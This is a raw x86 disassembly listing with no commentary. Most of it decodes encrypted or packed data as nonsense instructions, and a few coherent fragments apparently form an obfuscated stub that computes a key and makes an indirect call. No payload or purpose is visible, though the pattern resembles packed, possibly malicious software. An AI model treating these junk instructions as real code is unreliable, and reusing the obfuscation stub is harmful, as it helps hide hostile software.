  40ca05:	nop
  40ca06:	fs loope 0x40ca08
  40ca09:	add    ecx,DWORD PTR [ebx+edi*2-0x20724858]
  40ca10:	in     al,0x5
  40ca12:	outs   dx,BYTE PTR ds:[esi]
  40ca13:	pop    ss
  40ca14:	dec    esp
  40ca15:	or     BYTE PTR [ebx+edx*8+0x9],bl
  40ca19:	mov    esp,0x792ad61d
  40ca1e:	inc    DWORD PTR [eax-0x3155f634]
  40ca24:	pusha  
  40ca25:	jnp    0x40c9f6
  40ca27:	fnstenv [ebp-0x5ef3feb6]
  40ca2d:	xchg   esi,eax
  40ca2e:	icebp  
  40ca2f:	jl     0x40c9e2
  40ca31:	leave  
  40ca32:	jbe    0x40c9ee
  40ca34:	mov    eax,ds:0xc7b8204
  40ca39:	dec    ebx
  40ca3a:	sbb    BYTE PTR [esi-0x62],0x1d
  40ca3e:	jns    0x40ca2a
  40ca40:	xchg   ebp,eax
  40ca41:	xchg   edx,eax
  40ca42:	dec    eax
  40ca43:	and    al,0xda
  40ca45:	push   esp
  40ca46:	enter  0x3298,0x27
  40ca4a:	or     eax,0x3fc099ed
  40ca4f:	das    
  40ca50:	jbe    0x40c9fe
  40ca52:	push   eax
  40ca53:	dec    ebp
  40ca54:	jle    0x40ca88
  40ca56:	jmp    0xa8cc:0x1bfe7eb2
  40ca5d:	ins    DWORD PTR es:[edi],dx
  40ca5e:	int3   
  40ca5f:	pushf  
  40ca60:	mov    al,0x88
  40ca62:	sbb    DWORD PTR [ebp+ebp*8+0x2eaeb0b6],ebx
  40ca69:	mov    bl,ah
  40ca6b:	int    0xfe
  40ca6d:	test   DWORD PTR [ebx-0x18],edx
  40ca70:	push   0x59725828
  40ca75:	stos   BYTE PTR es:[edi],al
  40ca76:	outs   dx,DWORD PTR ds:[esi]
  40ca77:	fs call 0xa120397e
  40ca7d:	cli    
  40ca7e:	jg     0x40caca
  40ca80:	loope  0x40caa6
  40ca82:	push   cs
  40ca83:	ja     0x40ca67
  40ca85:	pop    ebp
  40ca86:	push   cs
  40ca87:	dec    ebp
  40ca88:	cmp    ecx,esi
  40ca8a:	xchg   dl,cl
  40ca8c:	push   ecx
  40ca8d:	cmc    
  40ca8e:	add    eax,0x1389a0d
  40ca93:	mov    eax,ds:0x8efd6ba1
  40ca98:	or     esi,ebx
  40ca9a:	pop    ds
  40ca9b:	inc    ebx
  40ca9c:	enter  0xd740,0xf7
  40caa0:	(bad)  
  40caa2:	pushf  
  40caa3:	fs data16 jae 0x40cae0
  40caa7:	in     al,dx
  40caa8:	xor    eax,0xf4f32bef
  40caad:	in     eax,0xf
  40caaf:	mov    bl,0x5e
  40cab1:	xlat   BYTE PTR ds:[ebx]
  40cab2:	fsub   QWORD PTR ds:0x99390eba
  40cab8:	clc    
  40cab9:	or     DWORD PTR [ecx],edi
  40cabb:	clc    
  40cabc:	sub    esp,DWORD PTR [esi+0x18]
  40cabf:	mov    bh,0x33
  40cac1:	cmp    BYTE PTR [ebx],0x7d
  40cac4:	and    al,BYTE PTR [esp+eiz*2+0x11e3b7cc]
  40cacb:	mov    esi,0x3483775d
  40cad0:	or     ah,cl
  40cad2:	idiv   BYTE PTR [edi]
  40cad4:	ret    
  40cad5:	test   DWORD PTR [edx+0x49c25451],esp
  40cadb:	xchg   ebx,eax
  40cadc:	and    al,BYTE PTR [ecx+0x5636a0ae]
  40cae2:	repz mov ebp,0x5cd7a11d
  40cae8:	xor    BYTE PTR [edi+0x74cc761c],0xd1
  40caef:	xchg   edi,eax
  40caf0:	sbb    edi,DWORD PTR es:[edi-0x7a]
  40caf4:	adc    eax,0xf8a58fbf
  40caf9:	test   eax,0x36a084c0
  40cafe:	inc    esi
  40caff:	inc    ebx
  40cb00:	or     ebp,DWORD PTR [ebp+0x54]
  40cb03:	loopne 0x40cb14
  40cb05:	dec    ebx
  40cb06:	ret    
  40cb07:	pop    es
  40cb08:	add    BYTE PTR [ebx+0xa13d606],ch
  40cb0e:	cmp    edx,DWORD PTR [esi]
  40cb10:	mov    eax,ds:0x9313a2f9
  40cb15:	loopne 0x40caa3
  40cb17:	inc    esi
  40cb18:	stos   DWORD PTR es:[edi],eax
  40cb19:	enter  0xfcd0,0xe1
  40cb1d:	sbb    DWORD PTR [esi+0x213b2de4],ebx
  40cb23:	mov    edx,0xcde86299
  40cb28:	add    eax,DWORD PTR [edi-0x2a]
  40cb2b:	shl    DWORD PTR [ecx-0x4b],1
  40cb2e:	je     0x40cb25
  40cb30:	push   es
  40cb31:	dec    ebx
  40cb32:	and    eax,0xd121c176
  40cb37:	mov    ebx,0xf2987b4d
  40cb3c:	sar    BYTE PTR [eax-0x42],0x66
  40cb40:	push   ebp
  40cb41:	and    BYTE PTR [eax],al
  40cb43:	sbb    BYTE PTR [ebx-0x1e78149b],ch
  40cb49:	fwait
  40cb4a:	jp     0x40cb3a
  40cb4c:	out    0xe3,eax
  40cb4e:	mov    dl,0xcf
  40cb50:	and    eax,0xa4c8b6e5
  40cb55:	in     eax,dx
  40cb56:	cmp    eax,0xd5b6f997
  40cb5b:	xchg   DWORD PTR [edi-0x5b],ecx
  40cb5e:	jecxz  0x40cb88
  40cb60:	mov    esi,0x74145cbd
  40cb65:	sub    eax,ebx
  40cb67:	or     BYTE PTR [esi-0x6b],ah
  40cb6a:	out    0x4,al
  40cb6c:	adc    BYTE PTR [ecx],dh
  40cb6e:	repz lock adc al,0xf8
  40cb72:	inc    edi
  40cb73:	sub    al,dl
  40cb75:	adc    al,0x14
  40cb77:	shl    DWORD PTR [ebp+0x53],cl
  40cb7a:	fsubr  st(1),st
  40cb7c:	in     eax,dx
  40cb7d:	cmp    cl,ah
  40cb7f:	push   0x25cff3e
  40cb84:	inc    ecx
  40cb85:	mov    edx,0x4dd83a5a
  40cb8a:	jecxz  0x40cb42
  40cb8c:	ror    BYTE PTR [esi+esi*2],cl
  40cb8f:	clc    
  40cb90:	and    esp,DWORD PTR [edx+0x22]
  40cb93:	inc    BYTE PTR [esp+edx*1]
  40cb96:	add    eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x2b]
  40cbfc:	push   ds
  40cbfd:	outs   dx,BYTE PTR ds:[esi]
  40cbfe:	repnz bound ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cc2c
  40cc08:	pushf  
  40cc09:	loope  0x40cc17
  40cc0b:	xchg   edx,eax
  40cc0c:	lods   eax,DWORD PTR ds:[esi]
  40cc0d:	pop    ss
  40cc0e:	hlt    
  40cc0f:	dec    eax
  40cc10:	scas   eax,DWORD PTR es:[edi]
  40cc11:	xlat   BYTE PTR ds:[ebx]
  40cc12:	push   cs
  40cc13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc14:	and    edi,0xa
  40cc17:	push   edi
  40cc18:	cdq    
  40cc19:	js     0x40cbd4
  40cc1b:	and    eax,0x6ea71516
  40cc20:	into   
  40cc21:	and    al,0x10
  40cc23:	ja     0x40cc6b
  40cc25:	dec    esp
  40cc26:	repz aad 0x0
  40cc29:	pop    ds
  40cc2a:	in     al,dx
  40cc2b:	repz adc eax,0x7d2cc912
  40cc31:	sub    al,0xc5
  40cc33:	(bad)  
  40cc34:	jne    0x40cbcb
  40cc36:	sbb    BYTE PTR [esi-0x39],dl
  40cc39:	into   
  40cc3a:	out    dx,al
  40cc3b:	mov    bl,0x3b
  40cc3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc3e:	cmc    
  40cc3f:	mov    dl,0xa
  40cc41:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40cc43:	in     eax,0xa5
  40cc45:	aam    0x58
  40cc47:	lods   eax,DWORD PTR ds:[esi]
  40cc48:	mov    eax,0xf9fe2aa3
  40cc4d:	jnp    0x40cbff
  40cc4f:	mov    ds:0xb8f7042,al
  40cc54:	ss dec esp
  40cc56:	push   ebp
  40cc57:	mov    ah,0x1e
  40cc59:	dec    ebx
  40cc5a:	cs push ecx
  40cc5c:	jne    0x40cc6e
  40cc5e:	xchg   ecx,eax
  40cc5f:	push   ebx
  40cc60:	(bad)
  40cc64:	(bad)  
  40cc65:	xlat   BYTE PTR ds:[ebx]
  40cc66:	jo     0x40cc37
  40cc68:	mov    dh,0x6
  40cc6a:	int3   
  40cc6b:	(bad)  
  40cc6c:	sbb    ah,BYTE PTR [eax-0x28]
  40cc6f:	sar    bh,cl
  40cc71:	mov    eax,ds:0x79a18869
  40cc76:	xor    BYTE PTR [eax+0x6cf6b170],0xc
  40cc7d:	loope  0x40cc9f
  40cc7f:	fs pop ebx
  40cc81:	xchg   ecx,eax
  40cc82:	xor    ebp,DWORD PTR [ebx+0x172db949]
  40cc88:	sbb    BYTE PTR [eax+0x7a],dl
  40cc8b:	add    DWORD PTR [ecx+0x4a8c84e1],eax
  40cc91:	sbb    ch,bl
  40cc93:	fld    QWORD PTR [esi+edx*2-0x79520285]
  40cc9a:	cdq    
  40cc9b:	sub    DWORD PTR [esi+0x41],esp
  40cc9e:	fs sub eax,0xc61b290b
  40cca4:	pop    ds
  40cca5:	sub    DWORD PTR [edx],eax
  40cca7:	pushf  
  40cca8:	imul   edi,edi,0x32
  40ccab:	fcomp  QWORD PTR [esi-0x7f]
  40ccae:	inc    edi
  40ccaf:	push   ds
  40ccb0:	pop    ss
  40ccb1:	xchg   esp,eax
  40ccb2:	sub    BYTE PTR [eax],dh
  40ccb4:	adc    al,0x40
  40ccb6:	in     eax,0xbb
  40ccb8:	inc    ecx
  40ccb9:	(bad)  
  40ccba:	inc    edx
  40ccbb:	inc    esi
  40ccbc:	pop    edx
  40ccbd:	ins    BYTE PTR es:[edi],dx
  40ccbe:	imul   ebp,DWORD PTR [ebx+0x1],0x1e
  40ccc2:	mov    WORD PTR [edx+0x3d1d3e8a],?
  40ccc8:	lods   eax,DWORD PTR ds:[esi]
  40ccc9:	mov    WORD PTR ds:0x5e68add8,ds
  40cccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccd0:	les    esi,FWORD PTR [ebx]
  40ccd2:	xor    ebp,DWORD PTR [esi]
  40ccd4:	(bad)  
  40ccd5:	gs lahf 
  40ccd7:	pop    ebp
  40ccd8:	push   eax
  40ccd9:	aad    0x78
  40ccdb:	push   edi
  40ccdc:	sti    
  40ccdd:	rol    DWORD PTR [eax+0x7bd6311f],cl
  40cce3:	cs jbe 0x40cc93
  40cce6:	inc    edx
  40cce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cce8:	in     al,dx
  40cce9:	pcmpeqd mm7,QWORD PTR [eax-0x5ae42a3c]
  40ccf0:	jae    0x40cd6c
  40ccf2:	or     ch,BYTE PTR [eax-0x2a]
  40ccf5:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccf7:	xor    al,dl
  40ccf9:	xchg   edx,eax
  40ccfa:	cs mov dh,0x57
  40ccfd:	lock xchg esp,eax
  40ccff:	popf   
  40cd00:	mov    bh,0x2
  40cd02:	fmul   st,st(1)
  40cd04:	xchg   dl,bh
  40cd06:	xlat   BYTE PTR ds:[ebx]
  40cd07:	pop    ebp
  40cd08:	add    al,cl
  40cd0a:	stos   DWORD PTR es:[edi],eax
  40cd0b:	loop   0x40cc9e
  40cd0d:	pop    ebx
  40cd0e:	inc    esi
  40cd0f:	jns    0x40cd61
  40cd11:	pop    edi
  40cd12:	fcom   st(4)
  40cd14:	xchg   edx,eax
  40cd15:	or     BYTE PTR [esi],bh
  40cd17:	or     eax,ebp
  40cd19:	mov    al,0x2
  40cd1b:	or     bl,dl
  40cd1d:	add    al,BYTE PTR [ebx]
  40cd1f:	repz pop edi
  40cd21:	inc    ebx
  40cd22:	ffreep st(5)
  40cd24:	aad    0x2
  40cd26:	outs   dx,BYTE PTR ds:[esi]
  40cd27:	or     DWORD PTR [ecx+0x201e1f2],edi
  40cd2d:	cld    
  40cd2e:	scas   eax,DWORD PTR es:[edi]
  40cd2f:	or     esp,DWORD PTR [ebp-0x37d8ce2c]
  40cd35:	inc    esp
  40cd36:	or     dl,dh
  40cd38:	sbb    dh,BYTE PTR [esi+0x3bb0b43]
  40cd3e:	mov    al,ds:0x820762da
  40cd43:	lock and al,0x2a
  40cd46:	lahf   
  40cd47:	mov    bl,0xdc
  40cd49:	cld    
  40cd4a:	daa    
  40cd4b:	add    BYTE PTR [edx-0x12],al
  40cd4e:	daa    
  40cd4f:	xchg   ecx,eax
  40cd50:	mov    esi,0xb08e0495
  40cd55:	pop    esp
  40cd56:	cmp    bh,ah
  40cd58:	out    dx,al
  40cd59:	iret   
  40cd5a:	push   ds
  40cd5b:	add    eax,0x2cb511b4
  40cd60:	test   BYTE PTR [ebp+0x4a],cl
  40cd63:	cli    
  40cd64:	jbe    0x40cce9
  40cd66:	arpl   cx,sp
  40cd68:	cwde   
  40cd69:	xchg   BYTE PTR ss:[ebx-0x5e],cl
  40cd6d:	(bad)  
  40cd6f:	pop    esp
  40cd70:	adc    dl,0x6
  40cd73:	fstp   st(0)
  40cd75:	mov    ds:0xe761335f,al
  40cd7a:	stos   DWORD PTR es:[edi],eax
  40cd7b:	jle    0x40cdb8
  40cd7d:	popa   
  40cd7e:	fmul   QWORD PTR [ebp+0x44]
  40cd81:	pusha  
  40cd82:	jle    0x40cd76
  40cd84:	or     al,0x52
  40cd86:	clc    
  40cd87:	or     BYTE PTR [esi],al
  40cd89:	lock or dh,dh
  40cd8c:	jg     0x40cdb4
  40cd8e:	mov    ch,0x44
  40cd90:	lods   al,BYTE PTR ds:[esi]
  40cd91:	mov    ebx,0x85f11ccc
  40cd96:	pop    ebx
  40cd97:	or     DWORD PTR [ebp+ecx*8-0x16ae2fce],edx
  40cd9e:	sbb    al,BYTE PTR [ecx+0x26488112]
  40cda4:	gs inc ecx
  40cda6:	nop
  40cda7:	mov    esp,0x6d98bb5e
  40cdac:	jno    0x40ce21
  40cdae:	xor    BYTE PTR [esi+ebp*8-0x1e53a776],dh
  40cdb5:	or     DWORD PTR [edx],esp
  40cdb7:	cmp    dl,BYTE PTR [esi-0x7b]
  40cdba:	sti    
  40cdbb:	mov    ebp,0x8bcf5f0f
  40cdc0:	mov    DWORD PTR [edi-0x3c120062],0xab1b4f97
  40cdca:	push   esp
  40cdcb:	sub    BYTE PTR [ecx-0x5b],ah
  40cdce:	mov    cl,0x33
  40cdd0:	in     al,dx
  40cdd1:	scas   eax,DWORD PTR es:[edi]
  40cdd2:	div    bl
  40cdd4:	inc    esi
  40cdd5:	outs   dx,BYTE PTR ds:[esi]
  40cdd6:	and    al,0x9f
  40cdd8:	jns    0x40cd93
  40cdda:	mov    edx,0xeff71e94
  40cddf:	xlat   BYTE PTR ds:[ebx]
  40cde0:	mov    edi,0xa5d1e16d
  40cde5:	loop   0x40ce4c
  40cde7:	and    ebx,DWORD PTR [ecx-0x414e48e]
  40cded:	cmc    
  40cdee:	stc    
  40cdef:	aad    0xb3
  40cdf1:	repnz popf 
  40cdf3:	repnz sbb DWORD PTR [esi+0x13cdaee2],edi
  40cdfa:	sub    al,0x21
  40cdfc:	and    DWORD PTR [ebx-0x60],ebp
  40cdff:	arpl   si,dx
  40ce01:	hlt    
  40ce02:	cwde   
  40ce03:	or     dh,ch
  40ce05:	into   
  40ce06:	push   0x7
  40ce08:	ja     0x40ce58
  40ce0a:	out    dx,eax
  40ce0b:	mov    dh,0xa3
  40ce0d:	mov    edi,0x8c090545
  40ce12:	sbb    edx,0x68
  40ce15:	sub    DWORD PTR [edi+0x639f9fe9],ebp
  40ce1b:	sti    
  40ce1c:	xchg   ecx,eax
  40ce1d:	les    ecx,FWORD PTR [esi+eax*1]
  40ce20:	js     0x40ce0d
  40ce22:	imul   ebx,DWORD PTR [ebp+0x2c14bc44],0x5a
  40ce29:	loope  0x40cdb7
  40ce2b:	nop
  40ce2c:	jb     0x40cdea
  40ce2e:	mov    eax,0xd749d88e
  40ce33:	cmp    BYTE PTR ds:0xc5233155,0xb2
  40ce3a:	xor    DWORD PTR [ebx+0x1],edx
  40ce3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce3e:	jnp    0x40cdc1
  40ce40:	jecxz  0x40ce2c
  40ce42:	mov    al,ds:0xf932778c
  40ce47:	mov    edi,0x914263f2
  40ce4c:	pop    edx
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	into   
  40ce63:	pop    ss
  40ce64:	iret   
  40ce65:	inc    eax
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	push   esp
  40ce6f:	adc    eax,0xdf728a47
  40ce74:	lods   eax,DWORD PTR ds:[esi]
  40ce75:	retf   0x3887
  40ce78:	in     al,dx
  40ce79:	dec    edx
  40ce7a:	jle    0x40ceca
  40ce7c:	adc    ah,BYTE PTR [esi+0x12]
  40ce7f:	lods   eax,DWORD PTR ds:[esi]
  40ce80:	rcl    DWORD PTR [edi-0x4d],0xef
  40ce84:	add    ch,BYTE PTR [esi+0x3c]
  40ce87:	xor    eax,0x1e05070d
  40ce8c:	jg     0x40ce9f
  40ce8e:	or     ecx,ebx
  40ce90:	sbb    DWORD PTR ds:0x13d0674,ecx
  40ce96:	fs hlt 
  40ce98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce99:	adc    ecx,DWORD PTR [ebx+eax*2+0x42]
  40ce9d:	jle    0x40ce6c
  40ce9f:	pop    ebp
  40cea0:	mov    eax,0x1800e229
  40cea5:	(bad)  
  40cea7:	push   ebx
  40cea8:	or     BYTE PTR [ebx],cl
  40ceaa:	fs cmp al,0xec
  40cead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceae:	lods   eax,DWORD PTR ds:[esi]
  40ceaf:	cmp    BYTE PTR [edi-0x4825d018],ch
  40ceb5:	ret    0x4f6f
  40ceb8:	std    
  40ceb9:	out    0x2a,eax
  40cebb:	cmp    BYTE PTR [edx-0x28c27cde],dl
  40cec1:	pop    ebp
  40cec2:	cmp    ebp,DWORD PTR [eax+0x16]
  40cec5:	test   BYTE PTR [esi-0x5c],0x3
  40cec9:	jge    0x40ce75
  40cecb:	jmp    0x40cebd
  40cecd:	xor    eax,0x9d25306f
  40ced2:	jns    0x40ce61
  40ced4:	mov    dl,0x6d
  40ced6:	jbe    0x40cf40
  40ced8:	inc    ecx
  40ced9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceda:	(bad)  
  40cedb:	in     al,dx
  40cedc:	adc    ecx,DWORD PTR [eax+ecx*4-0xf]
  40cee0:	or     ecx,edi
  40cee2:	lods   al,BYTE PTR ds:[esi]
  40cee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cee4:	and    eax,0x9addbc9c
  40cee9:	cmp    ch,ch
  40ceeb:	push   edi
  40ceec:	push   0xea037c5b
  40cef1:	scas   al,BYTE PTR es:[edi]
  40cef2:	test   eax,0xda9379d6
  40cef7:	push   es
  40cef8:	cmp    edx,DWORD PTR [eax]
  40cefa:	jle    0x40cf4c
  40cefc:	mov    ds:0x71604cfc,eax
  40cf01:	cmp    edx,DWORD PTR [edx-0x190ef89]
  40cf07:	sbb    al,BYTE PTR [edx+0x50]
  40cf0a:	fist   DWORD PTR [ebx+0x54]
  40cf0d:	dec    ebx
  40cf0e:	mov    bl,0xde
  40cf10:	xor    eax,0x357a2275
  40cf15:	in     al,0x44
  40cf17:	fadd   QWORD PTR [eax-0x2680df05]
  40cf1d:	push   ss
  40cf1e:	and    eax,0x603a78b2
  40cf23:	push   edx
  40cf24:	jmp    0xae6dd7d3
  40cf29:	xchg   ebp,eax
  40cf2a:	cld    
  40cf2b:	mov    edx,0x97f2ca7
  40cf30:	test   eax,0xaf828567
  40cf35:	outs   dx,DWORD PTR ds:[esi]
  40cf36:	and    al,0xce
  40cf38:	dec    edx
  40cf39:	cmp    esi,DWORD PTR [edx+0x6176de40]
  40cf3f:	adc    edi,DWORD PTR [ecx+0x2aec5eae]
  40cf45:	fld    QWORD PTR [ecx+edi*1-0x73]
  40cf49:	rcl    edx,cl
  40cf4b:	loopne 0x40cf6f
  40cf4d:	and    eax,0x5bc8fcef
  40cf52:	sub    eax,0x6edb617d
  40cf57:	pop    esp
  40cf58:	xchg   esp,eax
  40cf59:	adc    eax,0xd04ebc8e
  40cf5e:	cmp    eax,0x619e7103
  40cf63:	mov    eax,0x257f61cb
  40cf69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf6a:	jb     0x40cfe2
  40cf6c:	retf   0x2e5f
  40cf6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf70:	lds    esp,FWORD PTR [ebp-0x6f]
  40cf73:	push   ebp
  40cf74:	sub    ch,BYTE PTR [ebx+0x6a453be2]
  40cf7a:	jmp    0x4cfede9
  40cf7f:	sahf   
  40cf80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf81:	das    
  40cf82:	ret    0x8cb
  40cf85:	sbb    eax,0xccb12e3f
  40cf8a:	shr    DWORD PTR fs:[edi-0x6dcaa826],cl
  40cf91:	inc    ecx
  40cf92:	loop   0x40cf54
  40cf94:	daa    
  40cf95:	mov    ch,0x75
  40cf97:	add    eax,0xded0368d
  40cf9c:	or     ch,bh
  40cf9e:	ss (bad) 
  40cfa1:	jp     0x40cf33
  40cfa3:	push   es
  40cfa4:	paddusb mm6,mm6
  40cfa7:	nop
  40cfa8:	and    edi,esp
  40cfaa:	leave  
  40cfab:	cmp    esp,ebx
  40cfad:	or     ah,BYTE PTR [edi+eiz*4]
  40cfb0:	mov    dh,0x5c
  40cfb2:	sub    DWORD PTR [ebx],eax
  40cfb4:	stc    
  40cfb5:	imul   ecx,DWORD PTR [eax-0x62],0x2b7ced9f
  40cfbc:	pop    ecx
  40cfbd:	sub    eax,0x3eb213c1
  40cfc2:	inc    esi
  40cfc3:	xchg   ebx,eax
  40cfc4:	dec    ebp
  40cfc5:	das    
  40cfc6:	push   edx
  40cfc7:	jp     0x40d01f
  40cfc9:	vmwrite esp,DWORD PTR [esi+edi*8]
  40cfcd:	cs adc al,0x6c
  40cfd0:	and    al,0x60
  40cfd2:	loop   0x40cf8e
  40cfd4:	lods   al,BYTE PTR ds:[esi]
  40cfd5:	cdq    
  40cfd6:	pop    ds
  40cfd7:	xor    DWORD PTR [ebp+0x2],0x72
  40cfdb:	(bad)  
  40cfdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfdd:	(bad)  
  40cfdf:	jg     0x40cf8f
  40cfe1:	fsubr  DWORD PTR [esi+ecx*8]
  40cfe4:	and    al,0x7f
  40cfe6:	mov    ebx,0x8fb81063
  40cfeb:	loop   0x40cf84
  40cfed:	adc    DWORD PTR [ebp+0x1e8d97e8],0x840c60f1
  40cff7:	dec    eax
  40cff8:	adc    eax,0xb68979f9
  40cffd:	xchg   BYTE PTR [ecx+edx*4+0xb7a9285],ah
  40d004:	int    0xff
  40d006:	mov    DWORD PTR [ecx+0x229c2181],eax
  40d00c:	push   ecx
  40d00d:	fidivr DWORD PTR [ebp+esi*2+0x57]
  40d011:	sbb    eax,0x3e11fa41
  40d016:	ss hlt 
  40d018:	lea    edi,[ecx-0x1f]
  40d01b:	les    ebx,FWORD PTR [ecx+0x72]
  40d01e:	jp     0x40d08c
  40d020:	jae    0x40d05e
  40d022:	adc    ch,0x90
  40d025:	xor    eax,0xd09c3516
  40d02a:	cmp    esi,DWORD PTR gs:[esi]
  40d02d:	jmp    0x40cfd8
  40d02f:	aam    0xf9
  40d031:	mov    al,ds:0xab146bc4
  40d036:	(bad)  
  40d037:	psllw  mm7,QWORD PTR [ecx-0x77eacced]
  40d03e:	dec    esp
  40d03f:	out    0x88,eax
  40d041:	mov    eax,ds:0xcf78e113
  40d046:	aaa    
  40d047:	bound  ebx,QWORD PTR [ebx-0x3d]
  40d04a:	jo     0x40d0ae
  40d04c:	pop    esp
  40d04d:	jo     0x40cfff
  40d04f:	dec    ebp
  40d050:	add    al,0x0
  40d052:	lods   eax,DWORD PTR ds:[esi]
  40d053:	cmp    ecx,DWORD PTR [edx+0x57db760c]
  40d059:	sar    BYTE PTR [edi+eax*8-0x4163e1c8],1
  40d060:	pop    esi
  40d061:	mov    bh,0xf3
  40d063:	jns    0x40d01e
  40d065:	mov    eax,0x82695fa6
  40d06a:	inc    ecx
  40d06b:	inc    ebp
  40d06c:	jmp    0xe55b:0x6f264e26
  40d073:	jne    0x40d0cc
  40d075:	(bad)
  40d078:	xchg   ebp,eax
  40d079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d07a:	mov    ch,0xba
  40d07c:	adc    eax,0xa85cd5f1
  40d081:	outs   dx,BYTE PTR ds:[esi]
  40d082:	dec    ecx
  40d083:	pop    ebx
  40d084:	mov    ebx,0x9a740a7c
  40d089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d08a:	jmp    0x6bf:0xe92ebc9
  40d091:	shl    eax,0x15
  40d094:	in     eax,0x35
  40d096:	dec    esi
  40d097:	les    ecx,FWORD PTR [edx-0x56136664]
  40d09d:	call   0xa65c0e46
  40d0a2:	jmp    0x40d06d
  40d0a4:	gs jmp 0x3a872fbb
  40d0aa:	inc    esp
  40d0ab:	fmul   DWORD PTR [edi]
  40d0ad:	inc    esp
  40d0ae:	popf   
  40d0af:	adc    dh,ah
  40d0b1:	jecxz  0x40d067
  40d0b3:	sbb    al,0x49
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	cdq    
  40d0d0:	sahf   
  40d0d1:	jne    0x40d0dd
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d109
  40d0dc:	mov    edi,0x6ef445ae
  40d0e1:	test   DWORD PTR [edi],esi
  40d0e3:	xchg   edi,eax
  40d0e4:	test   BYTE PTR [esi-0x1e],al
  40d0e7:	or     cl,BYTE PTR [esi+0x50]
  40d0ea:	adc    eax,0xb3d28614
  40d0ef:	mov    BYTE PTR [eax+0x2fbe35eb],al
  40d0f5:	ret    0xd55d
  40d0f8:	and    dh,BYTE PTR [esi+0x11fa4a5e]
  40d0fe:	mov    edi,ebp
  40d100:	enter  0x8cd0,0xae
  40d104:	mov    esi,0x6d825236
  40d109:	(bad)  
  40d10a:	enter  0xead3,0x5c
  40d10e:	iret   
  40d10f:	aaa    
  40d110:	mov    edi,eax
  40d112:	mov    ebx,0x48d5f499
  40d117:	xchg   edi,eax
  40d118:	hlt    
  40d119:	test   al,0x17
  40d11b:	pop    ebx
  40d11c:	xchg   ebp,eax
  40d11d:	sub    cl,al
  40d11f:	lods   eax,DWORD PTR ds:[esi]
  40d120:	adc    al,0xc
  40d122:	pop    ecx
  40d123:	push   esp
  40d124:	call   DWORD PTR [esi+0x5b]
  40d127:	sub    al,0x85
  40d129:	cdq    
  40d12a:	(bad)  
  40d12b:	mov    ebx,DWORD PTR [eax]
  40d12d:	(bad)  
  40d12e:	adc    ecx,DWORD PTR [esi]
  40d130:	and    BYTE PTR [esi-0x3e600f5d],bh
  40d136:	mov    ch,0x7a
  40d138:	ds neg ecx
  40d13b:	dec    ebp
  40d13c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d13d:	jmp    0x8f5d1c97
  40d142:	iret   
  40d143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d144:	and    DWORD PTR cs:[ecx],ebx
  40d147:	mov    ds,WORD PTR [ebx+ecx*2-0x2776dc59]
  40d14e:	imul   eax,DWORD PTR [edx+esi*8-0x22],0xffffff83
  40d153:	push   esi
  40d154:	gs std 
  40d156:	out    dx,al
  40d157:	stc    
